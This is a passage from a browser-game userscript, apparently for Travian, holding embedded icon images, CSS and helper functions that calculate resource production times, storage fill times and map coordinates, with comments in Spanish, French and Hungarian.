	imagenes["imgpaste"] = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAALGPC/xhBQAAAAZiS0dEAHMAaQBai4lpJQAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9ALFw00HbQA5MUAAAHMSURBVHichZM9aFNRFMd/j/e6FyoFJ0mqiy7ZTQikAUGlgzgp3US6ZBE6KA6ObumcwS0OLhFBgkQcSkimQsmHWQRFYjEggqZ5ybsf7zg076WxaXrgcOHe8//d83GvwwLbSKzK1u0kl9c0h602r9/iLIoD8ADS6bSc3tzZXuHh40+0D/ZIJNvAK/n+Kz0nrNfrDoCXyWSkXC6jlALgTWmTe9sfaR/sMRj8IAi+cuPqJaDOzpN9rLVYaykUCtLr9RxPRFBK0Wg0sNYC8OjBNQD+jK5P71sH1qnVamitMcbEsV6UUkRe23jGzSuGSqVypt5mswlAMpkkDMMZIAgCjDGEYYi1Nj4slUpnIMVikW63y2QymQGUUjEggkSWSCTmAK7r8uH9O27d2aLf788AWmtEJIYss92nzwHI5XLiiUhcwkUANR7y8sUug99jvnw+ZPPufeIpXARQ4yGihthgxOrKMUyOTnoQAbTWAAsBp8VGHSNqiBMMZ008XULky8Q2GOOImmUAnAtYJA7VXxwzHaPv+1SrVTzv5E39D1gkDgMfogxarZbT6XTmPpPrumSzWX5+63KkfcSMQE1X7SN6BEadO2YA8vm8AEs9lUrJP7/afV7h9kN4AAAAAElFTkSuQmCC";
	imagenes["imgatti"] = "data:image/gif;base64,R0lGODlhEAAQAOYAAJoxM5EqLocoK8BKTre6vsnKy6mqq/T58nu0X1qNQOTv3srivFN8OU1zNVuGPnGiUFqAQXqnXJG9c4yyc4Kla+rz5FqEPVF3N0xuNGqYSoKtZIWvaIClZoivbZnAfpq9gcfcuNnozsXatevv4vH06vj49KGhoJ2dnNjUwevj1uamSNKeUuKrW7+RT7SKTeizZLOMVKOCUamPaa2VcsashtnBnamXfMSxlsOJN7KEQ+fWv9HLw7Kro/Ls5qmop7KNeqRuX71vZrJVTqlSTbtMTOrq6unp6eXl5ePj4+Li4t3d3dra2tjY2NbW1tDQ0M7OzsrKysnJycjIyMbGxsXFxcPDw729vbu7u7m5ubi4uLa2trW1tbOzs66urqurq6mpqaWlpaOjo6KiopOTk////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAGQALAAAAAAQABAAAAengFlWWmSFhlJXXIZkYFFFUYtNSklii2RdVUdPhV1JS16WhSZTSFBPVEhjoYZfS0xYRlsFq4ZhTU4ntIsEBig/QENBJZY1MDcpPkICAgBEI6EzLywxQQECAQM9ljw5LTo2CwkNCQgVizIrODuFFRkYDhoKiy4qNIsRDRYRILqFGvkZJIgwR2sDAwYWHnjoMEFeqA8NIFi4kGHDBA2rQnCgQILMgQOFAgEAOw==";
	imagenes["imgattc"] = "data:image/gif;base64,R0lGODlhEAAQAPcAAAEBAxEYIyktMxIXHictNMnKy1x4kig8TVd4k0JYajFRaUlrhhklLVZnc0ZleElpfGB+j4eXoExTV0VldV15hxsjJ1R4iEdhbU1pdnCLmHCDjCs7Qp+ts0hfZ05ueU1nb0lhaVRud5Oip0pqc5qxuG58gE5VV2tydExnbmJ9hBEVFm+Ch7jEx7C4ulVkZ3+Tl3uFh7m+v77O0Wdtbougo5yqrIqcnrPDxYiQkY6YmbC7vK+6uyswMMvY2MDMzL/Ly3B3d2BmZj9DQz5CQi0wMM7a2s3Z2cPPz73IyLvGxrG8vJukpFNYWMTPz5CYmI6Wlo2VlX6FhX2EhGhublleXs7Z2Tw/Pzs+PikrK52kpJGXlx0eHr/Fxc7a2aawr6avrnN6eW1ycYKHhl9nZTw/PlxhXVNYU4mNiaGhoOamSNKeUr+RT7SKTeizZLOMVKmPaa2VcsashtnBncSxlsOJN7KEQ9HLw7KrowMCAerq6unp6eXl5ePj4+Li4t3d3dra2tjY2NbW1s7OzsrKysnJycjIyMbGxsXFxcPDw729vbu7u7m5ubi4uLa2trW1tbOzs66urqurq6mpqaWlpaOjo6KiopOTkwAAAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAJgALAAAAAAQABAAAAjfABklaoSpoMFCih4ZxDSJUB5CCwP56VNpISZIiPYIKgipz59IFguiMcRnkKBDfCyFNCjpD6BFehwVKBhBRkhKMVqcMFNmTIASJkJymSEAwIADChoQSGBQjps5O0JsYLDAAAISLDgshNPmUgUMDoqIOfPCSxaDd+qswWNhgoYuVHT8IAPmCKY3aujYUfGAQpMvQYoUyQEDCSY2aeJg8jDiRhEfVnAUyQAhjMUPKXpUgSJkiAQQF7TYNYiCRhEjW6Jg4uFiBZMlCzuIEGyloBMiWIBIWWijhuArBpNMeaIkIAA7";
	}

    var cssStyle = "#resumen {position: relative; width:900px;}";
	cssStyle += "#tabla_mapa {position: relative; width:900px; margin-top: 16px;}";
	cssStyle += ".bttable {width:100%; height:129px;}";
	cssStyle += ".dcol {color:#A0A0A0;}";
	// BBcodeHelper's style rule
	cssStyle += '.bbchelp {height:18px; background-color:#ddd; color:#a55; font-weight:600; font-size:11px; font-family:"Lucida Grande",Verdana,Helvetica,sans-serif; text-align:center; margin:1px 2px;}';
	// NPC Helper's style rules by gp
	cssStyle += '.gp-container { margin: 3px 0 0; font-size: 10px }';
	cssStyle += '.gp-red { color: #dd0000 }';
	cssStyle += '.gp-green { color: #009900 }';
	cssStyle += '.gp-highlight { background-color: #ffffcc }';
	//center numbers by ms99, Nux
	cssStyle += ".CNbuildingtags{background-color:" + CN_COLOR_NEUTRAL + "; border:thin solid #000000; -moz-border-radius: 2em; padding-top: 2px; font-family: Arial,Helvetica,Verdana,sans-serif; font-size:10pt; font-weight:bold; color:" + CN_COLOR_TEXT + "; text-align:center; position:absolute; width:21px; height:18px; cursor:pointer; visibility:hidden; z-index:26;}";
	cssStyle += "#resDiv{position:absolute; top:70px; left:12px; z-index:20;}";
	GM_addStyle(cssStyle);

	var XPFirst = XPathResult.FIRST_ORDERED_NODE_TYPE; // Constante que devuelve el primer elemento por XPath
	var XPList = XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE; // Constante que devuelve una lista de elementos por XPath
	var XPListO = XPathResult.ORDERED_NODE_SNAPSHOT_TYPE;
	var XPIter = XPathResult.UNORDERED_NODE_ITERATOR_TYPE; // Constante que deuvelve un iterador de elementos por XPath

	/** Fonction qui ne fait absolument rien. Utilisé lorsqu'il n'ya pas d'autre choix que d'utiliser une fonction */
	function dummy()
	{
	}

	function basename(path)
	{
		return path.replace(/.*\//, "");
	}

	function getRandTimeRange(maxrange)
	{ // input in milliseconds output in milliseconds
		var nr = Math.floor(maxrange * (0.6 + 0.4 * Math.random()));
		return nr;
	}

	function getInnerText(who)
	{
		return (who.textContent ? who.textContent : who.innerHTML);
	}
	/** Fonction qui permet de convertir un nombre en sa version 2 chiffres. Créer "0" si vous avez seulement un chiffre
	 *
	 * Params:
	 *	n	Numero a convertir
	 *
	 * Returns:
	 * 	El numero convertido con al menos dos digitos
	 */
	function LZ(n)
	{
		return (n > 9 ? n : '0' + n);
	}

	/** Wrapper para la funcion getElementById
	 *
	 * Params:
	 *	id	Texto del ID del elemento a buscar
	 *
	 * Returns:
	 * 	Elemento del documento con el ID especificado
	 */
	function get(id, doc)
	{
		if(!doc)
			var doc = document;
		return doc.getElementById(id);
	}

	/** Multiplier chaque élément d'un tableau avec une valeur
	 *
	 * Params:
	 *	a	Array con los elementos a procesar
	 *	n	Valor numero por el que multiplicar el array
	 *
	 * Returns:
	 *	Nuevo array con los valores calculados
	 */
	function arrayByN(a, n)
	{
		var b = arrayClone(a);
		for (var i in b)
		{
			b[i] *= n;
		}
		return b;
	}

	/**Faire une copie d'une valeur tableau
	 *
	 * Params:
	 *	a	Array a copiar
	 *
	 * Returns:
	 *	Referencia a un nuevo array con el mismo contenido que el original
	 */
	function arrayClone(a)
	{
		var b = new Array();
		for (var i in a)
		{
			b[i] = a[i];
		}
		return b;
	}

	/** Ajoute le contenu de deux tableaux. Si l'un des deux n'a pas de valeur, il renvoie une copie d'un autre
	 *
	 * Params:
	 *	a	Primer array sumando
	 *	b	Segundo array sumando
	 *
	 * Returns:
	 *	Referencia a un nuevo array con la suma
	 */
	function arrayAdd(a, b)
	{
		if (!a)
		{
			return arrayClone(b);
		}
		if (!b)
		{
			return arrayClone(a);
		}
		var c = new Array();
		for (var i = 0; i < Math.max(a.length, b.length); c[i] = a[i] + b[i++])
			;
		return c;
	}

	/** Vérifiez si une valeur est présente dans un tableau
	 *
	 * Params:
	 *	array	Array a comprobar
	 *	value	Valor a buscar en el array
	 *
	 * Returns:
	 *	true si el valor esta en el array, false en caso contrario
	 */
	function arrayValueExist(array, value)
	{
		for (var i = 0; i < array.length; i++)
			if (array[i] == value)
				return true;
		return false;
	}

	/** Supprime un élément
	 *
	 * Param:
	 *	elem	El elemento a eliminar
	 */
	function removeElement(elem)
	{
		if (elem)
		{
			elem = (typeof (elem) == 'string') ? get(elem) : elem;
			elem.parentNode.removeChild(elem)
		}
	}


	function dispatchOnChange(elem)
	{
		elem = (typeof (elem) == 'string') ? get(elem) : elem;
		var evObj = document.createEvent('HTMLEvents');
		evObj.initEvent( 'change', true, false );
		elem.dispatchEvent(evObj);
	}

	function dispatchClick(elem)
	{
		elem = (typeof (elem) == 'string') ? get(elem) : elem;
		var evObj = document.createEvent('MouseEvents');
		evObj.initEvent( 'click', true, false );
		elem.dispatchEvent(evObj);
	}


	/** Convertit certaines entités de HTML en sont équivalent ASCII
	 *
	 * Params:
	 *	string: Cadena a convertir
	 *
	 * Returns:
	 *	Cadena convertida
	 */
	function decodeEntity(string)
	{
		return string.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&apos;/g, "'").replace(/&quot;/g, "\"").replace(/&amp;/g, "&");
	}

	/** Déplacer un élément de place dans un arbre DOM
	 *
	 * Params:
	 *	elem: Elemento a desplazar
	 *	dest: Nuevo padre del elemento
	 */
	function moveElement(elem, dest)
	{
		removeElement(elem);
		dest.appendChild(elem);
	}

	/** Somme de toutes les valeurs d'un tableau
	 *
	 * Params:
	 *	a	Array a sumar
	 *
	 * Returns:
	 *	Valor con la suma de todos los elementos del array
	 */
	function arrayToInt(a)
	{
		var h = 0;
		for (var i in a)
		{
			h += a[i];
		}
		return h;
	}

	/** Insérer un nœud après l'autre
	 *
	 * Params:
	 *	node		Nodo de referencia
	 *	referenceNode	Nodo a insertar
	 */
	function insertAfter(node, referenceNode)
	{
		node.parentNode.insertBefore(referenceNode, node.nextSibling);
	}

	function $names(name)
	{
		return document.getElementsByName(name);
	}

	function $tags(tag, doc)
	{
		if(!doc)
			var doc = document;
		return doc.getElementsByTagName(tag);
	}

	/** Il crée un élément contenant un ou plusieurs parametres
	 *
	 * Params:
	 *	tag	Etiqueta del nuevo elemento
	 *	content	Contenido del nuevo elemento en formato texto
	 *
	 * Returns:
	 *	Referencia al nuevo elemento creado
	 */
	function $elem(tag, content, attributes, style, parent)
	{

		var ret = document.createElement(tag);
		if (content)
			ret.innerHTML = content;

		if (attributes)
			for (a in attributes)
				ret.setAttribute(a, attributes[a]);

		if (style)
			for (a in style)
				ret.style[a] = style[a];

		if (parent)
		{
			parent = (typeof(parent) == 'string') ? get(parent) : parent;
			parent.appendChild(ret);
		}
		return ret;
	}


	/** Crée un nouveau type d'élément DIV contenant le préfixe
	 *
	 * Params:
	 *	content	Contenido del nuevo elemento creado
	 *
	 * Returns:
	 * 	Referencia al nuevo elemento
	 */
	function div(content)
	{
		return $elem("div", content);
	}


	/** Recherche dans le document en utilisant XPath
	 *
	 * Params:
	 *	xpath	Expresion de busqueda
	 *	xpres	Tipo de busqueda
	 *	doc optional, searches within the given collection, default is document.
	 *		It can take a string as a document's innerHTML or a single html object.
	 *
	 * Returns:
	 *	Referencia a un elemento resultado de XPath
	 */
	function find(xpath, xpres, doc)
	{
		if (!doc)
			var doc = document;
		else
			if (typeof doc == 'string')
				doc = $elem('div', doc);
		var ret = document.evaluate(xpath, doc, null, xpres, null);
		return xpres == XPFirst ? ret.singleNodeValue : ret;
	}

	/** Créer ou mettre à jour la valeur d'un cookie, avec une certaine longueur
	 *
	 * Params:
	 *	name	Nombre de la cookie
	 *	value	Contenido de la cookie
	 *	days	Duracion de la validez de la cookie
	 */
	function createCookie(name, value, days)
	{
		if (typeof GM_setValue == "undefined")
		{
			if (days)
			{
				var date = new Date();
				date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
				var expires = "; expires=" + date.toGMTString();
			}
			else
				var expires = "";
			document.cookie = name + "=" + value + expires + "; path=/";
		}
		else
			GM_setValue(name, value);
	}

	/** parametres
	 * @param key: name of the parameter in the cookie.
	 * @param defaultValue: this is returned if the parameter is not found in the cookie.
	 * @param type: if set, type conversion occurs. Values {string, integer, boolean} The conversion occurs only if it is not the defaultValue being returned.
	 */
	function getOption(key, defaultValue, type)
	{
		var options = readCookie('options');
		if (options == null)
			return defaultValue;
		options = options.split(",");
		var myOption = options.indexOf(key);
		if (myOption < 0)
		{
			return defaultValue;
		}
		switch (type)
		{
			case "boolean":
				var myOption = (options[myOption + 1] == "true") ? true : false;
				break;
			case "integer":
				var myOption = parseInt(options[myOption + 1]);
				break;
			case "string":
			default:
				var myOption = decodeURIComponent(options[myOption + 1]);
				break;
		}
		return myOption;
	}

	function setOption(key, value)
	{
		var options = readCookie("options");
		if (options != '')
			options = options.split(",");
		else
			options = [];
		var myOption = options.indexOf(key);
		if (myOption < 0)
		{
			options.push(key);
			options.push(encodeURIComponent(value));
		}
		else
		{
			options[myOption + 1] = encodeURIComponent(value);
		}
		options.join(",");
		createCookie("options", options, 365);
	}


	/** Récupérer la valeur d'un témoin
	 *
	 * Params:
	 *	name	Nombre de la cookie
	 *
	 * Returns:
	 *	Contenido de la cookie o null si no existe
	 */
	function readCookie(name, def)
	{	if (!def)
			def = null;
		if (typeof GM_getValue == 'undefined')
		{
			var ca = document.cookie.split(';');
			var nameEQ = name + "=";
			for (var i = 0; i < ca.length; i++)
			{
				var c = ca[i];
				while (c.charAt(0) == ' ')
					c = c.substring(1, c.length); // Elimina espacios
				if (c.indexOf(nameEQ) == 0)
					return c.substring(nameEQ.length, c.length);
			}
			return def;
		}
		else
			return GM_getValue(name, def);
	}

	/** Pour supprimer un cookie
	 *
	 * Params:
	 *	name	Nombre de la cookie
	 */
	function eraseCookie(name)
	{
		createCookie(name, "", -1);
	}

	/** Il crée un chemin à une image basée dans pack grafico (Résolution du bug frimg)
	 *
	 * Params:
	 *	ref	Ruta relativa a la imagen
	 *
	 * Returns:
	 *	Ruta absoluta a la imagen
	 */
	imgx = readCookie("imgx");
	if (imgx == true || imgx == null)
	{
		function img(ref, lang_dependant)
		{
			return (!lang_dependant ? "img/un/" + ref : "img/" + find("//img[contains(@src,'plus.gif')]", XPFirst).src.match(/.*img\/(\w+)\/a/)[1] + '/' + ref);
		}
	}
	else
	{
		function img(ref)
		{
			return ("http://imgtrav.ifrance.com/img/" + ref);
		}
	}

	/** Calculer l'identifiant des coordonnées X e Y d'une case
	 *
	 * Params:
	 *	x	Coordenada X
	 *	y	Coordenada Y
	 *
	 * Returns:
	 *	ID de la casilla correspondiente a las coordenadas
	 */
	function xy2id(x, y)
	{
		return (1 + (parseInt(x) + 400) + (801 * Math.abs(parseInt(y) - 400)));
	}

	function zid2x(z)
	{
		return (((z - 1) % 801) - 400);
	}

	function zid2y(z)
	{
		return (400 - (parseInt(((z - 1) / 801))));
	}

	function id2xy(id)
	{
		var x = (id % 801) - 401;
		var y = 400 - (id - 401 - x) / 801;
		//alert(id-401-x);
		//alert(x+'|'+y);
		return {
			x: x,
			y: y
		};
	}


	/** Il calcule le nombre de secondes de l'heure en format  xx:xx:xx
	 *
	 * Params:
	 *	myElement	Texto con la hora a calcular
	 *
	 * Returns:
	 *	Numero de segundos que expresa la hora
	 */
	function calcular_segundos(myElement)
	{
		var p = myElement.split(":");
		return (p[0] * 3600) + (p[1] * 60) + (p[2] * 1);
	}

	/** Conversion d'un montant en quelques secondes dans sa représentation en heures.
	 * Funcion inversa de "calcular_segundos"
	 *
	 * Params:
	 *	s	Numero de segundos
	 *
	 * Returns:
	 *	Texto con la representacion en horas o la cadena "0:00:0?" si es negativo
	 */
	function formatear_tiempo(s)
	{
		if (s > -1)
		{
			var horas = Math.floor(s / 3600);
			var minutos = Math.floor(s / 60) % 60;
			var segundos = s % 60;
			var t = horas + ":" + LZ(minutos) + ":" + LZ(segundos);
		}
		else
			var t = "0:00:0?";
		return t;
	}

	/** Fonction responsable pour l'affichage du texte de ressources restantes pour la construction */
	function calculateBuildTime()
	{
		// Las celdas son los enlaces susceptibles de ser sustituidos por la nueva informacion
		var celdas = find("//span[@class='c']", XPList);
		// Las tablas son por cada uno de los edificios ampliables que se han detectado en la pagina
		var tablas = find("//div[@id='lmid2']/div/table[@class='f10' and not(@width)]", XPList);
		if (tablas.snapshotLength == 0)
			tablas = find("//div[@id='lmid2']/form/table[@class='f10' and not(@width)]", XPList);
		var k = celdas.snapshotLength - 1;

		// Se comienza por el final para evitar confusiones con otra informacion, ya que suele
		// estar lo ultimo en el caso de un unico edificio
		for (var j = tablas.snapshotLength - 1; j >= 0; j--)
		{
			var tabla = tablas.snapshotItem(j);
			var celda = tabla.rows[0].firstChild;
			var recursos = celda.textContent.split("|").splice(0, 4);
			if (recursos.length != 4)
				continue;

			var a = calculateResourceTime(recursos);
			var b = celdas.snapshotItem(k);
			// Por si hay mas tablas que celdas
			if (b)
			{
				// Si lo que hay antes de la celda es un enlace, entonces se trata de la cola del Plus
				if (b.firstChild && b.previousSibling.previousSibling.nodeName == 'A')
					continue;
				// Se elimina la informacion existente antes de poner la nueva
				if (a != null)
				{
					if (b.firstChild && b.previousSibling.previousSibling.nodeName == 'TABLE')
						while (b.hasChildNodes())
							b.removeChild(b.firstChild);
					b.appendChild(div(a));
					b.appendChild($elem('BR'));
					k--;
				}
			}
		}
	}

	/** Récupérez l'identifiant du village actif
	 *
	 * Returns:
	 *	El ID de la aldea o 0 si es la unica aldea
	 */
	function getIdAldea()
	{
		var a = find("//a[@class='active_vl']", XPFirst);
		if (a)
		{
			a.getAttribute("href").search(/\?newdid=(\d+)/);
			return RegExp.$1;
		}
		else
			return 0;
	}


	/**
	 * Calcula el desplazamiento en pixeles a partir del 23 enlace
	 * lateral (aldeas o enlaces personalizados)
	 *
	 * Returns:
	 *	El desplazamiento en pixeles
	 */
	function longitudPantalla(){ // for ms99, Nux
		var topx = 0;
		var rightx = 0;
		var bx = 0;
		var middlex = 0;
		var menux = 0;
		var troopx = 0;
		var mapx = 0;
		var maxTopY = 0;
		
		var docElem = get("ltop1");
		if (docElem != null) topx = parseInt(docElem.offsetHeight);
		
		docElem = get("lright1");
		if (docElem != null) rightx = parseInt(docElem.offsetHeight);
		
		docElem = find("//td[@class='menu']", XPFirst);
		if (docElem != null) menux = 60 + parseInt(docElem.scrollHeight); //+60
		
		docElem = get("navi_table");
		if (docElem != null) navix = parseInt(docElem.offsetHeight); //+60
		
		docElem = get("lleft");
		if (docElem != null) leftx = parseInt(docElem.offsetHeight); //+60
	/*	
		docElem = get("lmidlc");
		if (docElem != null) middlex = topx + parseInt(docElem.offsetHeight);
	*/	
		docElem = get("lmid1");
		if (docElem != null) middlex1 = parseInt(docElem.offsetHeight);
		
		docElem = get("lres0");
		if (docElem != null) middlex2 = parseInt(docElem.offsetHeight);
		
	/*	docElem = get("ltbw1");
		if (docElem != null) middlex2 += parseInt(docElem.offsetHeight);
		
		docElem = get("lrpr");
		if (docElem != null) middlex2 += parseInt(docElem.offsetHeight);
		
		docElem = get("ltrm");
		if (docElem != null) middlex2 += parseInt(docElem.offsetHeight); //+170
		
		docElem = get("lbau1");
		if (docElem != null) middlex2 += parseInt(docElem.offsetHeight);
		
		//middlex2 += 60;
		
		docElem = get("map_content");
		if (docElem != null) {
			docElem = docElem.firstChild;
			if (docElem != null) mapx = topx + 10 + parseInt(docElem.offsetHeight);
		}
	*/	
		maxTopY = leftx;
		if (navix >= maxTopY) maxTopY = navix;
		if (menux >= maxTopY) maxTopY = menux;
		if (rightx >= menux) maxTopY = rightx;
		if (middlex >= maxTopY) maxTopY = middlex;
		if (middlex1 >= maxTopY) maxTopY = middlex1;
		if (middlex2 >= maxTopY) maxTopY = middlex2;
		if (mapx >= maxTopY) maxTopY = mapx;
		
		docElem = get("configuracion");
		if (docElem != null) maxTopY = middlex + parseInt(docElem.offsetHeight);
		
		//maxTopY = maxTopY;
		if (maxTopY < 0) maxTopY = 0;
		
	//	var maxX = document.body.clientWidth;
	//	if (maxX >= 1600 && !blocNotasinfo && getDocDirection != 'rtl') maxTopY = 0;
		return maxTopY;
	}


	/** Calculer les ressources restantes et le temps requis pour une quantité désirée et retourne une chaîne en HTML avec cette information
	 *
	 * Params:
	 *	necesario:	Array con la cantidad deseada de cada tipo de recurso
	 *
	 * Returns:
	 *	Cadena de texto en HTML con la informacion sobre el tiempo y recursos que faltan
	 */
	function calculateResourceTime(necesario)
	{
		var tiempo_max = 0;
		var a = null;
		var res_table = '';

		// Calcula y crea una cadena con lo que falta de cada recurso
		// A negy nyersanyagfajta
		for (var i = 0; i < 4; i++)
		{
			necesario[i] = necesario[i] - 0;
			// kell meg = epiteshez szukseges- amink van
			var restante = necesario[i] - actual[i];
			if (restante > 0)
			{
				var tiempo = Math.round(restante / produccion[i]);
				if (tiempo < 0 || total[i] - necesario[i] < 0)
				{
					tiempo_max = 'Infinity';
					res_table += '<tr><td><img src="' + img('r/' + (i + 1) + '.gif') + '" width="18" height="12" border="0" title="' + T('RECURSO' + (i + 1)) + '"></td><td align="right" id="timeout' + i + '">' + restante + '</td><td>' + T('NUNCA') + '</td></tr>';
				}
				else
				{
					if (tiempo > tiempo_max && tiempo_max != 'Infinity')
					{
						tiempo_max = tiempo;
					}
					tiempo = formatear_tiempo(tiempo + 5);
					res_table += '<tr><td><img src="' + img('r/' + (i + 1) + '.gif') + '" width="18" height="12" border="0" title="' + T('RECURSO' + (i + 1)) + '"></td><td align="right" id="timeout' + i + '">' + restante + '</td><td align="right" id="timeout" width="60">' + tiempo + '</td></tr>';
				}
			}
		}

		// Calcula y crea una cadena con el tiempo que falta hasta conseguir los recursos
		if (tiempo_max == 'Infinity')
		{
			// Soha nem lesz eleg nyersanyag szoveg.
			a = '<table align="left">' + res_table + '<tr><td colspan="2">' + T('LISTO') + '</td><td>' + T('NUNCA') + '</td></tr></table>';
		}
		else
			if (tiempo_max > 0)
			{
				var tiempo2 = formatear_tiempo(tiempo_max + 5); // Introduce un margen de 5 segundos para compensar la desviancion de los temporizadores de javascript
				var fecha = new Date();
				fecha.setTime(fecha.getTime() + (tiempo_max * 1000));

				// Meg kell szoveg: resourcecsik, ora Kesz ma szoveg, mikorra keszul
				// tl.
				a = '<table align="left">' + res_table + '<tr><td colspan="2">' + T('LISTO') + '</td><td>' + calcularTextoTiempo(fecha) + '</td></tr></table>';
			}
		return a;
	}

	/** Ecrit le temps nécessaire pour atteindre certaine date
	 *
	 * Params:
	 *	fecha:	Objeto de tipo Date con la fecha futura
	 *
	 * Returns:
	 *	Cadena de texto con el calculo de tiempo restante
	 */
	function calcularTextoTiempo(fecha)
	{
		var ahora = new Date();

		// Calcula la diferencia de horas entre la fecha dada y la actual
		// para saber si se trata de las proximas 72 horas
		var horas = ((fecha.getTime() - ahora.getTime()) / 1000 / 60 / 60);
		horas += ahora.getHours() + (ahora.getMinutes() / 60);
		var tiempo_restante = '';
		if (horas < 24)
			tiempo_restante = T('HOY');
		else
			if (horas < 48)
				tiempo_restante = T('MANYANA');
			else
				if (horas < 72)
					tiempo_restante = T('PAS_MANYANA');
				else
					tiempo_restante = T('EL') + " " + LZ(fecha.getDate()) + "/" + LZ((fecha.getMonth() + 1));

		return tiempo_restante + " " + T('A_LAS') + " " + LZ(fecha.getHours()) + ":" + LZ(fecha.getMinutes());
	}

	/** Calculer le montant estimatif maximum de temps pour parvenir à l'ressources fondées sur le montant et la production effective de chaque type d'appel
	 *
	 * Params:
	 *	necesario:	Array con la cantidad deseada de cada tipo de recurso
	 *
	 * Returns:
	 *	Tiempo maximo en segundos hasta conseguir los recursos deseados
	 */
	function calculateTime(necesario)
	{
		var tiempo_max = 0;
		var tiempo = 0;

		for (var i = 0; i < 4; i++)
		{
			var restante = necesario[i] - actual[i];
			if (restante > 0)
			{
				tiempo = Math.round(restante / produccion[i]);
				if (tiempo > tiempo_max)
					tiempo_max = tiempo;
				if (tiempo < 0)
					tiempo_max = 'Infinity';
			}
		}

		if (tiempo_max > 0 && tiempo_max != 'Infinity')
			tiempo_max = formatear_tiempo(tiempo_max + 5); // Se introduce un margen de 5 segundos para compensar posibles desviaciones en los temporizadores de javascript
		return tiempo_max;
	}

	/** Assigner une couleur en fonction du temps qui s'écoule */
	function calculateHighlight(produccionHora, tiempo, tiempoRestante)
	{
		var color = '';

		if (produccionHora < 0)
		{
			color = '#FF0000';
		}
		else
			if (tiempo <= 3600)
			{
				color = 'Magenta';
			}
			else
				if (tiempo <= 18000)
				{
					color = '#ffa500';
				}
				else
					if (tiempo <= 36000)
					{
						color = '#7b68ee';
					}

		var ret = tiempoRestante;
		if (color != '')
			ret = '<font color="' + color + '">' + ret + '</font>';

		return ret;
	}

	/** Il calcule et affiche le temps estimé jusqu'à ce que le remplissage / vidage des entrepôts et des granges */
	FillTimeinfo = readCookie("FillTimeinfo");
	if (FillTimeinfo == false || FillTimeinfo == null)
	{
		var FillTime = '30px';
	}
	else
	{
		var FillTime = '0px';
	}
	function calculateFillTime()
	{
		calculateFillTimeInfo = readCookie("calculateFillTimeInfo" + server);
		if (calculateFillTimeInfo == true || calculateFillTimeInfo == null)
		{
			var lres = find("//div[starts-with(@id,'lres')]",XPFirst); // For compatibility of servers like the german ones where id varies 'lres0 ... lres3' etc.
	 	    var tBody = lres;
			while (!tBody.tagName || tBody.tagName.toLowerCase() != 'tr') // Get table or tbody (if tbody exists)
		 		if (!tBody.tagName) // Skip text nodes...
					tBody = tBody.nextSibling;
				else
					tBody = tBody.childNodes[0];
			tBody = tBody.parentNode;

			var tr = $elem('tr')
			for (var i = 0; i < 4; i++)
			{
				var td = $elem('td', '', {
					'colspan': '2',
					'align': 'center'
				});
				var tiempo;
				if (produccion[i] < 0)
					tiempo = Math.round(actual[i] / -produccion[i]);
				else
					if (produccion[i] == 0) // Si la produccion es 0, el tiempo es infinito
						tiempo = -1;
					else // Si la produccion es negativa, se calcula el tiempo hasta el vaciado
		 				tiempo = Math.round((total[i] - actual[i]) / produccion[i]);

				var celda = $elem("span", '', {}, {
					"fontSize": "9px",
					"color": "#909090",
					"position": "relative",
					"top": FillTime,
					"whiteSpace": "nowrap",
					"paddingLeft": "7px",
					"textAlign": "center"
				});

				var produccionHora = get('l' + (4 - i)).title;
				var tiempoRestante = "<span id='timeouta' style='font-weight:bold' noreload='1'>" + formatear_tiempo(tiempo) + "</span>";

				var tmpStr = "<span>";
				tmpStr += "<span>(" + (produccionHora > 0 ? '+' : '') + produccionHora + ",</span>"
				tmpStr += "<span>" + calculateHighlight(produccionHora, tiempo, tiempoRestante) + "</span><span>)</span>";
				tmpStr += "</span>";
				celda.innerHTML = tmpStr
				td.appendChild(celda);
				tr.appendChild(td);
			}
			tr.appendChild($elem('td')); // Fill the last td (Pop counter)
			tBody.insertBefore(tr, tBody.childNodes[0]);
			lres.setAttribute('style', 'top:84px;');
		}
	}

	/** Traduit une chaîne de caractères en utilisant la langue global détecté
	 *
	 * Params:
	 *	texto:	Cadena de texto a traducir
	 *
	 * Returns:
	 *	Cadena de texto traducida
	 */
	function T(texto)
	{

		texto = texto.toUpperCase();

		try
		{
			return aLang[texto] == undefined ? '!' + texto + '!' : aLang[texto];
		}
		catch (e)
		{
			return '!' + texto + '!';
		}

	}

	function F(texto, args)
	{

		texto = aLang[texto] == undefined ? '!' + texto + '!' : aLang[texto];

		if (args != undefined)
			for (var i in args)
				texto = texto.replace(i, args[i]);
		return texto;
	}

	/** Récupérer initiale informations génériques pour le reste des fonctions */
	function getGeneralData()
	{
		// Por cada tipo de recurso: cantidad actual almacenada, capacidad total del almacen / granero y produccion por segundo
		if(document.location.href.indexOf('karte2') == -1) // Not on karte2 (13x13) map
			for (var i = 0; i < 4; i++)
			{
				var a = get('l' + (4 - i));
				actual[i] = a.innerHTML.split("/")[0];
				total[i] = a.innerHTML.split("/")[1];
				produccion[i] = a.title / 3600;
			}
		//
		getDocDirection = document.defaultView.getComputedStyle(document.body, null).getPropertyValue("direction");
		// Identificador de aldea actual
        id_aldea = getIdAldea();
		// Identify the userid
        var menu = document.evaluate("//td[@class='menu']/a[3]", get("navi_table"), null, XPFirst, null).singleNodeValue;
		userID = ((menu.search.split("="))[1]);
